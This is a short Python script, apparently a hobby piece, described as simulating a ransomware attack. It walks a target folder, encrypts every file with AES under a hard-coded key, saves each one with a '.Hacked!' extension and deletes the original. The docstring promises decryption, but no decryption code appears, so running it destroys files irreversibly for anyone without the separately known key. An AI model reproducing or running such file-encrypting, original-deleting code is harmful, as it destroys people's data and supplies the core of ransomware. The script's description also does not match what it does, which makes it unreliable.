"""

Simple script to simulate the procedure of a Ransomware attack
The script encrypts and decrypts target files'

"""""
_author_ = "Victor Marquez"
_version_ =0.2

import os
from pathlib import Path
from Crypto.Cipher import AES


def detectFiles(mainPath):
    for entry in os.scandir(mainPath):
        if entry.is_file():
            yield entry

def encryptFile(file, Pkey,Path):
    #Read file
    dataFIle = file
    with open(dataFIle, 'rb') as f:
        data = f.read()

    #Convert data to byte
    dataByte = bytes(data)


    #Encrypt the data with the key
    cipher = AES.new(Pkey, AES.MODE_EAX)
    chiphertext, tag = cipher.encrypt_and_digest(dataByte)

    #Save data
    fileName = file.name.removesuffix(file.suffix)
    fileExtension = ".Hacked!"
    encFile = Path+"/"+fileName + fileExtension
    with open(encFile, 'wb') as f:
        [f.write(x) for x in (cipher.nonce,tag,chiphertext)]
        f.close()
        os.remove(file)




path = "Path where encrypted files are located"
for file in detectFiles(path):
    filePath = Path(file)
    encryptFile(filePath,b'Sixyeen byte key',path) #Key, script will not work if keys are not the same
